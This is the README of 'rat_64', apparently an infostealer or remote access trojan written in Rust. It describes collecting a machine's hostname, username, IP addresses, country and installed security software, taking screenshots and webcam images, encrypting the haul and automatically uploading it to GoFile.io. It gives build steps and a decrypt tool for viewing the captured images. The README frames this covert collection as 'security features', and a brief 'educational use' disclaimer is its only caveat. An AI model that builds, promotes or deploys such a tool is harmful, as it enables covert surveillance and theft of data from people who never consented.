# rat_64

Cross-platform system information collection and encryption tool

## Overview

This tool is a Rust application designed to collect detailed system information, encrypt it, and securely store or transmit the data.

### Collected Information
- **System Info**: Hostname, OS details, username, processor info, CPU core count
- **Network Info**: Local IP, global IP, country code
- **Security Info**: Installed security software (Windows only)
- **Visual Info**: Screenshot, webcam image (optional)

### Security Features
- **AES-256-GCM Encryption**: Military-grade encryption for data protection
- **Random Key Generation**: Generates a new 32-byte key on each run
- **MessagePack Format**: Efficient binary serialization
- **Base64 Encoding**: Safe data transfer

## Build Instructions

### Basic Features (Recommended)

```bash
cargo build --release
```

### With Webcam Feature

To use the webcam feature, set up OpenCV and LLVM/Clang beforehand:

**Windows:**
1. Install Visual Studio Build Tools or Visual Studio
2. Install LLVM (https://releases.llvm.org/download.html)
3. Set environment variables:
    - `LIBCLANG_PATH`: Path to clang.dll (e.g., `C:\Program Files\LLVM\bin`)
    - `LLVM_CONFIG_PATH`: Path to llvm-config.exe

**macOS:**
```bash
brew install llvm opencv
export LIBCLANG_PATH="/opt/homebrew/opt/llvm/lib"
```

**Linux (Ubuntu/Debian):**
```bash
sudo apt install llvm-dev libclang-dev libopencv-dev
```

Then, build with the webcam feature enabled:
```bash
cargo build --release --features webcam
```

## Usage

### 1. Data Collection & Encryption (Main Program)

```bash
# Run in debug mode
cargo run

# Build and run in release mode
cargo build --release
./target/release/rat_64
```

**Output:**
- `data.dat` - Encrypted system info and image data
- Automatic upload to GoFile.io (if configured)

### 2. Data Decryption & Analysis

```bash
# Build the decryption tool
cargo build --bin decrypt

# Run decryption
./target/debug/decrypt data.dat
```

**Decryption Output:**
- Detailed system information
- `screenshot.png` - Desktop screenshot
- `webcam.png` - Webcam image (if captured)

## About Encryption Keys

### Key Generation & Management

**Automatic Key Generation (Default):**
- Generates a new 32-byte AES-256 key on each run
- Also generates a 12-byte nonce
- Key and nonce are embedded in the data file

**Key Types:**
```rust
// AES-256 key (32 bytes)
let key: [u8; 32] = [/* randomly generated */];

// Nonce (12 bytes) - initialization vector for encryption
let nonce: [u8; 12] = [/* randomly generated */];
```

### Security Levels

**Level 1 - Base64 Encoding (Legacy):**
- Simple Base64 encoding
- Decrypt: `./target/debug/decrypt data.dat`

**Level 2 - AES-256-GCM Encryption (Recommended):**
- Military-grade AES-256 encryption
- Authenticated encryption (tamper detection)
- Automatic key and nonce management

### Handling Key Files

**Using External Key File (Optional):**
```bash
# Use a 32-byte key file
./target/debug/decrypt data.dat my_key.key
```

**Notes:**
- Key file must be exactly 32 bytes
- Lost keys cannot be recovered; data cannot be decrypted
- Use a proper key management system for production

## Advanced Usage

### 1. Build with Webcam Feature

```bash
# After OpenCV setup
cargo build --release --features webcam
./target/release/rat_64
```

### 2. Verify Encrypted Data

```bash
# Check data file contents
file data.dat
hexdump -C data.dat | head

# Decrypt and inspect contents
./target/debug/decrypt data.dat
```

### 3. Use Custom Key

```python
# Example: Generate key file (Python)
import os
key = os.urandom(32)
with open('custom_key.key', 'wb') as f:
     f.write(key)
```

```bash
# Decrypt with custom key
./target/debug/decrypt data.dat custom_key.key
```

## Data Format Specification

### MessagePack Structure
```json
{
     "info": "base64_encoded_encrypted_system_info",
     "images": "base64_encoded_encrypted_images",
     "key": "base64_encoded_aes_key",      // when using AES
     "nonce": "base64_encoded_nonce"       // when using AES
}
```

### System Info Structure
```rust
struct SystemInfo {
     hostname: String,           // Computer name
     os_name: String,            // OS type
     os_version: String,         // OS version
     username: String,           // Username
     global_ip: String,          // External IP
     local_ip: String,           // Internal IP
     cores: usize,               // CPU core count
     security_software: Vec<String>, // Security software
     processor: String,          // CPU info
     country_code: String,       // Country code
}
```

## Troubleshooting

### Common Issues

**OpenCV Build Error:**
```bash
# Windows: Visual Studio Build Tools required
# macOS: brew install llvm opencv
# Linux: sudo apt install llvm-dev libclang-dev
```

**Decryption Error:**
- Check for file corruption
- Verify key file length (32 bytes)
- Try Base64 decryption

**Screenshot Failure:**
- Additional setup may be required for Wayland environments
- Possible permission issues

## Security Warning

⚠️ **Important:** This tool is developed for educational and research purposes.
- Do not run on systems without the owner's consent
- Manage collected data responsibly
- Legal responsibility lies with the user

## License

This project is intended for personal and educational use only. Commercial use and misuse are prohibited.